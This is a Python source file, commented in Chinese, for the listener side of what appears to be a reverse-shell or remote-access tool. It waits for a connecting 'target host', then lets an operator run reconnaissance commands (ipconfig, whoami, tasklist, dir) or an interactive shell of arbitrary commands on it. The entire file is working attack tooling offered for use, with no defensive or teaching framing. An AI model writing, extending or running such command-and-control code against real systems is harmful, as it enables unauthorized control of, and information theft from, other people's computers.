import socket
import base64

ip_port = ('127.0.0.1', 10080)

sk = socket.socket()            # 创建套接字
sk.bind(ip_port)                # 绑定服务地址
sk.listen(5)                    # 监听连接请求
print('     _     _____                 _____                    _    \n'
    '  /\| |/\ |  __ \               |  __ \                /\| |/\ \n'
  '  \ ` \' / | |  | |  ___   _   _ | |  | |  ___   _   _  \ ` \' / \n'
   ' |_     _|| |  | | / _ \ | | | || |  | | / _ \ | | | ||_     _|\n'
   '  / , . \ | |__| || (_) || |_| || |__| || (_) || |_| | / , . \ \n'
    '  \/|_|\/ |_____/  \___/  \__,_||_____/  \___/  \__,_| \/|_|\/ ')
print('启动监听服务，等待客户端连接...')
conn, address = sk.accept()     # 等待连接，此处自动阻塞
print('成功建立连接！')
info = conn.recv(1024).decode()
print('连接目标系统信息：'+info)
print('\033==================================OPTION==================================\033')

def system_info():    #获取目标主机信息模块
    print('\033==================================system_info==================================\033')
    while True:
        msg = input('请输入要查询的命令：(可输入查询命令)\n1>>ip信息\n2>>用户信息\n3>>查询当前路径\n4>>进程信息\n5>>当前路径文件\n6>>退出\n')
        if msg == '1':
            shell_code = 'ipconfig'
        elif msg == '2':
            shell_code = 'whoami'
        elif msg == '3':
            shell_code = 'chdir'
        elif msg == '4':
            shell_code = 'tasklist'
        elif msg == '5':
            shell_code = 'dir'
        elif msg == '6':
            shell_code = 'exit'
            conn.sendall(shell_code.encode())
            print('\033==================================OPTION==================================\033')
            break
        else:
            shell_code = msg
        conn.sendall(shell_code.encode())
        client_reply = conn.recv(40960).decode()
        client_reply = base64.b64decode(client_reply).decode('utf-8')
        print(client_reply)
        print('\033==================================system_info==================================\033')

def get_shell():     #执行命令模块
    print('\033==================================shell==================================\033')
    while True:
        msg = input('请输入要执行的shell：')
        if msg == 'exit':
            conn.sendall(msg.encode())
            break
        conn.sendall(msg.encode())
        client_reply = conn.recv(1024).decode()
        print(client_reply)
        print('\033==================================shell==================================\033')


if __name__ == "__main__":
    while True:  # 一个死循环，直到客户端发送‘exit’的信号，才关闭连接
        option = input('1>>system_info\n2>>shell\n3>>exit\n')
        server_data = conn.sendall(option.encode())

        if int(option) == 1:
            system_info()

        elif int(option) == 2:
            get_shell()

        elif int(option) == 3:
            shell_exit = '结束通信！'
            conn.sendall(shell_exit.encode())
            print('通信结束！')
            break
